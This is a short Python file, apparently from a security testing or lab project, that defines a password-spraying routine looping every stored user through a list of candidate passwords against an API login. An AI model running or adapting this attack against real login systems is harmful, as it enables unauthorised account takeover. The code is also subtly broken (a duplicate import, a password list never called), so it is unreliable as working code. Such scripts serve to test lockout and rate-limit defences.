from context import ctx
from models.orm.users import User
from client import ApiClientService
from models.orm.user_handler import User

def password_spraying():
    """
    password_spraying attack
    :return:
    """
    users = ctx.user_handler.get_all_users()
    print(users)
    passwords = ctx.file_manager.get_password_spraying_passwords
    client_service = ApiClientService()
    for user in users:
        for password in passwords:
            client_service.login(username=user.username, password=password)


if __name__ == "__main__":
    password_spraying()
